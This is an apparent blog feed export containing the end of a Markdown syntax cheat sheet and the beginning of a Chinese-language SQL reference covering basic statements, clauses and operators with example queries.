<p><a class="link"   href="http://www.google.fr/"  title="Named link title">Named Link <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and <a class="link"   href="http://www.google.fr/" >http://www.google.fr/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or <a class="link"   href="http://example.com/" >http://example.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<pre><code>Markup :  [Named Link](http://www.google.fr/ &quot;Named link title&quot;) and http://www.google.fr/ or &lt;http://example.com/&gt;
</code></pre>
<p><a href="#heading-1" title="Goto heading-1">heading-1</a></p>
<pre><code>Markup: [heading-1](#heading-1 &quot;Goto heading-1&quot;)
</code></pre>
<p>Table, like this one :</p>
<table>
<thead>
<tr>
<th>First Header</th>
<th>Second Header</th>
</tr>
</thead>
<tbody><tr>
<td>Content Cell</td>
<td>Content Cell</td>
</tr>
<tr>
<td>Content Cell</td>
<td>Content Cell</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">First Header  | Second Header</span><br><span class="line">------------- | -------------</span><br><span class="line">Content Cell  | Content Cell</span><br><span class="line">Content Cell  | Content Cell</span><br></pre></td></tr></table></figure></div>

<p>Adding a pipe <code>|</code> in a cell :</p>
<table>
<thead>
<tr>
<th>First Header</th>
<th>Second Header</th>
</tr>
</thead>
<tbody><tr>
<td>Content Cell</td>
<td>Content Cell</td>
</tr>
<tr>
<td>Content Cell</td>
<td>|</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">First Header  | Second Header</span><br><span class="line">------------- | -------------</span><br><span class="line">Content Cell  | Content Cell</span><br><span class="line">Content Cell  |  \| </span><br></pre></td></tr></table></figure></div>

<p>Left, right and center aligned table</p>
<table>
<thead>
<tr>
<th align="left">Left aligned Header</th>
<th align="right">Right aligned Header</th>
<th align="center">Center aligned Header</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Content Cell</td>
<td align="right">Content Cell</td>
<td align="center">Content Cell</td>
</tr>
<tr>
<td align="left">Content Cell</td>
<td align="right">Content Cell</td>
<td align="center">Content Cell</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Left aligned Header | Right aligned Header | Center aligned Header</span><br><span class="line">| :--- | ---: | :---:</span><br><span class="line">Content Cell  | Content Cell | Content Cell</span><br><span class="line">Content Cell  | Content Cell | Content Cell</span><br></pre></td></tr></table></figure></div>

<p><code>code()</code></p>
<pre><code>Markup :  `code()`
</code></pre>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> specificLanguage_code = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;lookedUpPlatform&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;query&quot;</span>: <span class="string">&quot;Kasabian+Test+Transmission&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lookedUpItem&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Test Transmission&quot;</span>,</span><br><span class="line">            <span class="string">&quot;artist&quot;</span>: <span class="string">&quot;Kasabian&quot;</span>,</span><br><span class="line">            <span class="string">&quot;album&quot;</span>: <span class="string">&quot;Kasabian&quot;</span>,</span><br><span class="line">            <span class="string">&quot;picture&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="string">&quot;link&quot;</span>: <span class="string">&quot;http://open.spotify.com/track/5jhJur5n4fasblLSCOcrTp&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<pre><code>Markup : ```javascript
         <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* Bullet list</span><br><span class="line">    * Nested bullet</span><br><span class="line">        * Sub-nested bullet etc</span><br><span class="line">* Bullet list item 2</span><br><span class="line"></span><br><span class="line">~~~</span><br><span class="line"> Markup : * Bullet list</span><br><span class="line">              * Nested bullet</span><br><span class="line">                  * Sub-nested bullet etc</span><br><span class="line">          * Bullet list item 2</span><br><span class="line"></span><br><span class="line">-OR-</span><br><span class="line"></span><br><span class="line"> Markup : - Bullet list</span><br><span class="line">              - Nested bullet</span><br><span class="line">                  - Sub-nested bullet etc</span><br><span class="line">          - Bullet list item 2 </span><br><span class="line">~~~</span><br><span class="line"></span><br><span class="line">1. A numbered list</span><br><span class="line">    1. A nested numbered list</span><br><span class="line">    2. Which is numbered</span><br><span class="line">2. Which is numbered</span><br><span class="line"></span><br><span class="line">~~~</span><br><span class="line"> Markup : 1. A numbered list</span><br><span class="line">              1. A nested numbered list</span><br><span class="line">              2. Which is numbered</span><br><span class="line">          2. Which is numbered</span><br><span class="line">~~~</span><br><span class="line"></span><br><span class="line">- [ ] An uncompleted task</span><br><span class="line">- [x] A completed task</span><br><span class="line"></span><br><span class="line">~~~</span><br><span class="line"> Markup : - [ ] An uncompleted task</span><br><span class="line">          - [x] A completed task</span><br><span class="line">~~~</span><br><span class="line"></span><br><span class="line">- [ ] An uncompleted task</span><br><span class="line">    - [ ] A subtask</span><br><span class="line"></span><br><span class="line">~~~</span><br><span class="line"> Markup : - [ ] An uncompleted task</span><br><span class="line">              - [ ] A subtask</span><br><span class="line">~~~</span><br><span class="line"></span><br><span class="line">&gt; Blockquote</span><br><span class="line">&gt;&gt; Nested blockquote</span><br><span class="line"></span><br><span class="line">    Markup :  &gt; Blockquote</span><br><span class="line">              &gt;&gt; Nested Blockquote</span><br><span class="line"></span><br><span class="line">_Horizontal line :_</span><br><span class="line">- - - -</span><br><span class="line"></span><br><span class="line">    Markup :  - - - -</span><br><span class="line"></span><br><span class="line">_Image with alt :_</span><br><span class="line"></span><br><span class="line">![picture alt](http://via.placeholder.com/200x150 &quot;Title is optional&quot;)</span><br><span class="line"></span><br><span class="line">    Markup : ![picture alt](http://via.placeholder.com/200x150 &quot;Title is optional&quot;)</span><br><span class="line"></span><br><span class="line">Foldable text:</span><br><span class="line"></span><br><span class="line">&lt;details&gt;</span><br><span class="line">  &lt;summary&gt;Title 1&lt;/summary&gt;</span><br><span class="line">  &lt;p&gt;Content 1 Content 1 Content 1 Content 1 Content 1&lt;/p&gt;</span><br><span class="line">&lt;/details&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">  &lt;summary&gt;Title 2&lt;/summary&gt;</span><br><span class="line">  &lt;p&gt;Content 2 Content 2 Content 2 Content 2 Content 2&lt;/p&gt;</span><br><span class="line">&lt;/details&gt;</span><br><span class="line"></span><br><span class="line">    Markup : &lt;details&gt;</span><br><span class="line">               &lt;summary&gt;Title 1&lt;/summary&gt;</span><br><span class="line">               &lt;p&gt;Content 1 Content 1 Content 1 Content 1 Content 1&lt;/p&gt;</span><br><span class="line">             &lt;/details&gt;</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line">&lt;h3&gt;HTML&lt;/h3&gt;</span><br><span class="line">&lt;p&gt; Some HTML code here &lt;/p&gt;</span><br></pre></td></tr></table></figure></div>
</code></pre>
<p>Link to a specific part of the page:</p>
<p><a href="#TOP">Go To TOP</a></p>
<pre><code>Markup : [text goes here](#section_name)
          section_title&lt;a name=&quot;section_name&quot;&gt;&lt;/a&gt;    
</code></pre>
<p>Hotkey:</p>
<p><kbd>⌘F</kbd></p>
<p><kbd>⇧⌘F</kbd></p>
<pre><code>Markup : &lt;kbd&gt;⌘F&lt;/kbd&gt;
</code></pre>
<p>Hotkey list:</p>
<table>
<thead>
<tr>
<th>Key</th>
<th>Symbol</th>
</tr>
</thead>
<tbody><tr>
<td>Option</td>
<td>⌥</td>
</tr>
<tr>
<td>Control</td>
<td>⌃</td>
</tr>
<tr>
<td>Command</td>
<td>⌘</td>
</tr>
<tr>
<td>Shift</td>
<td>⇧</td>
</tr>
<tr>
<td>Caps Lock</td>
<td>⇪</td>
</tr>
<tr>
<td>Tab</td>
<td>⇥</td>
</tr>
<tr>
<td>Esc</td>
<td>⎋</td>
</tr>
<tr>
<td>Power</td>
<td>⌽</td>
</tr>
<tr>
<td>Return</td>
<td>↩</td>
</tr>
<tr>
<td>Delete</td>
<td>⌫</td>
</tr>
<tr>
<td>Up</td>
<td>↑</td>
</tr>
<tr>
<td>Down</td>
<td>↓</td>
</tr>
<tr>
<td>Left</td>
<td>←</td>
</tr>
<tr>
<td>Right</td>
<td>→</td>
</tr>
</tbody></table>
<p>Emoji:</p>
<p>:exclamation: Use emoji icons to enhance text. :+1:  Look up emoji codes at <a class="link"   href="http://emoji-cheat-sheet.com/" >emoji-cheat-sheet.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<pre><code>Markup : Code appears between colons :EMOJICODE:
</code></pre>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>MarkDown</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL手册</title>
    <url>/2022/10/30/SQL%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><h2 id="二、语句"><a href="#二、语句" class="headerlink" title="二、语句"></a>二、语句</h2><h3 id="1、select"><a href="#1、select" class="headerlink" title="1、select"></a><strong>1、select</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>,字段<span class="number">2</span>  <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure></div>

<h3 id="2、distinct"><a href="#2、distinct" class="headerlink" title="2、distinct"></a><strong>2、distinct</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> 字段名 <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure></div>

<h3 id="3、insert-into"><a href="#3、insert-into" class="headerlink" title="3、insert into"></a><strong>3、insert into</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名(字段<span class="number">1</span>,字段<span class="number">2</span>) <span class="keyword">values</span>(字段值<span class="number">1</span>,字段值<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="4、update"><a href="#4、update" class="headerlink" title="4、update"></a><strong>4、update</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 字段<span class="number">1</span><span class="operator">=</span>字段值<span class="number">1</span>,字段<span class="number">2</span><span class="operator">=</span>字段值<span class="number">2</span> <span class="keyword">where</span> 查询条件</span><br></pre></td></tr></table></figure></div>

<h3 id="5、delete"><a href="#5、delete" class="headerlink" title="5、delete"></a><strong>5、delete</strong></h3><p>1、删除指定数据行</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 查询条件</span><br></pre></td></tr></table></figure></div>

<p>2、删除全部数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名;</span><br><span class="line"> 或</span><br><span class="line"><span class="keyword">delete</span> <span class="operator">*</span> <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure></div>

<h3 id="6、select-into"><a href="#6、select-into" class="headerlink" title="6、select into"></a><strong>6、select into</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql 数据库不支持 <span class="keyword">select</span> ... <span class="keyword">into</span> 语句，但支持 [<span class="keyword">insert</span> <span class="keyword">into</span> ... <span class="keyword">select</span>]</span><br><span class="line">#<span class="keyword">select</span> <span class="keyword">into</span> 语句从一个表复制数据，然后把数据插入到另一个新表中。</span><br></pre></td></tr></table></figure></div>

<p>1、复制新表</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> 新表名 <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure></div>

<p>2、复制指定列到新表</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段名 <span class="keyword">into</span> 新表名 <span class="keyword">from</span> 表名 </span><br></pre></td></tr></table></figure></div>

<p>3、只复制中国的网站插入到新表中：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> 新表名 <span class="keyword">from</span> 表名 <span class="keyword">where</span> ‘web’ <span class="operator">=</span> ‘中国’</span><br></pre></td></tr></table></figure></div>

<p>4、复制多个表中的数据插入到新表中</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 表<span class="number">1.</span>字段名,表<span class="number">2.</span>字段名 <span class="keyword">into</span> 新表名</span><br><span class="line"><span class="keyword">from</span> 表<span class="number">1</span> <span class="keyword">left</span> <span class="keyword">join</span> 表<span class="number">2</span> <span class="keyword">on</span> 表<span class="number">1.</span>id <span class="operator">=</span> 表<span class="number">2.</span>id</span><br></pre></td></tr></table></figure></div>

<p>5、复制一个空表</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> 新表名 <span class="keyword">from</span> 表名 <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="7、insert-into-select"><a href="#7、insert-into-select" class="headerlink" title="7、insert into select"></a><strong>7、insert into select</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">select</span> <span class="keyword">into</span> <span class="keyword">from</span> 和 <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">select</span> 都是用来复制表。</span><br><span class="line">#两者的主要区别为：</span><br><span class="line">#<span class="keyword">select</span> <span class="keyword">into</span> <span class="keyword">from</span> 要求目标表不存在，因为在插入时会自动创建；</span><br><span class="line">#<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">select</span> <span class="keyword">from</span> 要求目标表存在。</span><br></pre></td></tr></table></figure></div>

<p>1、从一个表中复制所有的列插入到另一个已存在的表中</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 要复制的表名;</span><br></pre></td></tr></table></figure></div>

<p>2、复制指定的列插入到另一个已存在的表中</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表<span class="number">1</span>(表<span class="number">1.</span>字段<span class="number">1</span>，表<span class="number">1.</span>字段<span class="number">2</span>)</span><br><span class="line"><span class="keyword">select</span> 表<span class="number">2.</span>字段<span class="number">1</span>,表<span class="number">2.</span>字段<span class="number">2</span> <span class="keyword">from</span> 表<span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="8、create-database"><a href="#8、create-database" class="headerlink" title="8、create database"></a><strong>8、create database</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>创建数据库</span><br><span class="line"><span class="keyword">create</span> database 数据库名;</span><br></pre></td></tr></table></figure></div>

<h3 id="9、create-table"><a href="#9、create-table" class="headerlink" title="9、create table"></a><strong>9、create table</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>创建数据表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名 </span><br><span class="line">(</span><br><span class="line"> 字段名 字段类型（最大长度）</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<h3 id="10、alter-table"><a href="#10、alter-table" class="headerlink" title="10、alter table"></a>10、alter table</h3><p>添加列</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> 列名 字段类型(<span class="type">int</span>) 是否为空(<span class="keyword">not</span> <span class="keyword">null</span>) 默认值(<span class="keyword">default</span>)</span><br></pre></td></tr></table></figure></div>

<p>删除列</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">column</span> 列名</span><br></pre></td></tr></table></figure></div>

<p>改变列</p>
<p>1、sql server &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">alter</span> <span class="keyword">column</span> 列名 字段类型</span><br></pre></td></tr></table></figure></div>

<p>2、my sql &#x2F; oracle：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名modify <span class="keyword">column</span> 列名 字段类型</span><br></pre></td></tr></table></figure></div>

<p>3、oracle 10g 之后版本:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify 列名 字段类型</span><br></pre></td></tr></table></figure></div>

<h3 id="11、group-by"><a href="#11、group-by" class="headerlink" title="11、group by"></a>11、group by</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于结合聚合函数，根据一个或多个列对结果集进行分组。</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name, aggregate_function(column_name) <span class="keyword">from</span> table_name </span><br><span class="line"><span class="keyword">where</span> column_name <span class="operator">=</span> <span class="keyword">value</span> </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> column_name;</span><br></pre></td></tr></table></figure></div>

<h2 id="三、子句"><a href="#三、子句" class="headerlink" title="三、子句"></a>三、子句</h2><h3 id="1、where"><a href="#1、where" class="headerlink" title="1、where"></a><strong>1、where</strong></h3><p>1、文本字段</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名<span class="keyword">where</span> 字段名<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>2、数值字段</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>3、运算符</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;</td>
<td>等于</td>
</tr>
<tr>
<td>&lt;&gt;</td>
<td>不等于。注释：在 SQL 的一些版本中，该操作符可被写成 !&#x3D;</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>&gt;&#x3D;</td>
<td>大于等于</td>
</tr>
<tr>
<td>&lt;&#x3D;</td>
<td>小于等于</td>
</tr>
<tr>
<td>BETWEEN</td>
<td>在某个范围内</td>
</tr>
<tr>
<td>LIKE</td>
<td>搜索某种模式</td>
</tr>
<tr>
<td>IN</td>
<td>指定针对某个列的多个可能值</td>
</tr>
</tbody></table>
<h3 id="2、top-和-limit"><a href="#2、top-和-limit" class="headerlink" title="2、top 和 limit"></a><strong>2、top 和 limit</strong></h3><p>（1）、返回前2行记录</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">2</span> <span class="operator">*</span> <span class="keyword">from</span> 表名;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 limit <span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>

<p>（2）、返回第3到10行的记录</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">10</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">3</span> 字段名 <span class="keyword">from</span> 表名)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 limit <span class="number">3</span>,<span class="number">7</span></span><br></pre></td></tr></table></figure></div>

<p>（3）、返回50%的记录</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">50</span> <span class="keyword">percent</span> <span class="operator">*</span> <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure></div>

<h3 id="3、having"><a href="#3、having" class="headerlink" title="3、having"></a>3、having</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">having 可以理解为group 的 where语句 </span><br><span class="line">在 sql 中增加 having 子句原因是，where 关键字无法与聚合函数一起使用。</span><br><span class="line">having 子句可以让我们筛选分组后的各组数据。</span><br></pre></td></tr></table></figure></div>

<p>having 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name, aggregate_function(column_name) <span class="keyword">from</span> table_name </span><br><span class="line"><span class="keyword">where</span> column_name operator <span class="keyword">value</span> </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> column_name </span><br><span class="line"><span class="keyword">having</span> aggregate_function(column_name) operator <span class="keyword">value</span>;</span><br></pre></td></tr></table></figure></div>

<h2 id="四、运算符"><a href="#四、运算符" class="headerlink" title="四、运算符"></a>四、运算符</h2><h3 id="1、and-or"><a href="#1、and-or" class="headerlink" title="1、and &amp; or"></a><strong>1、and &amp; or</strong></h3><p>1、如果第一个条件和第二个条件都成立，则 and 运算符显示一条记录。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;张三&#x27;</span> <span class="keyword">and</span> sex <span class="operator">=</span><span class="string">&#x27;男&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>2、如果第一个条件和第二个条件中只要有一个成立，则 or 运算符显示一条记录。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;张三&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span><span class="string">&#x27;李四&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>3、您也可以把 and 和 or 结合起来（使用圆括号来组成复杂的表达式）。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> (name<span class="operator">=</span><span class="string">&#x27;张三&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span><span class="string">&#x27;李四&#x27;</span>) <span class="keyword">and</span> sex <span class="operator">=</span><span class="string">&#x27;男&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="2、exists"><a href="#2、exists" class="headerlink" title="2、exists"></a>2、exists</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">运算符用于判断查询子句是否有记录，如果有一条或多条记录存在返回 true，否则返回 false。</span><br></pre></td></tr></table></figure></div>

<p>sql exists 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s)</span><br><span class="line"><span class="keyword">from</span> table_name</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">exists</span>(<span class="keyword">select</span> column_name <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">condition</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="五、关键字"><a href="#五、关键字" class="headerlink" title="五、关键字"></a>五、关键字</h2><h3 id="1、order-by"><a href="#1、order-by" class="headerlink" title="1、order by"></a><strong>1、order by</strong></h3><p>1、正序排列</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 字段名;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure></div>

<p>2、倒序排列</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure></div>

<h2 id="六、操作符"><a href="#六、操作符" class="headerlink" title="六、操作符"></a>六、操作符</h2><h3 id="1、like"><a href="#1、like" class="headerlink" title="1、like"></a>1、like</h3><p>1、查询以a开头的数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;a%&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>2、查询以a结尾的数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;%a&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>3、查询包含a的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;%a%&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>4、查询不包含a的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">not</span> <span class="keyword">like</span> <span class="string">&#x27;%a%&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>5、查询一个任意字符开始，然后是 “a” 的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;_a&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>6、查询一个任意字符开始，然后是 “a_c_e” 的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;a_c_e&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>7、查询以a或者b或者c开始的所有数据</p>
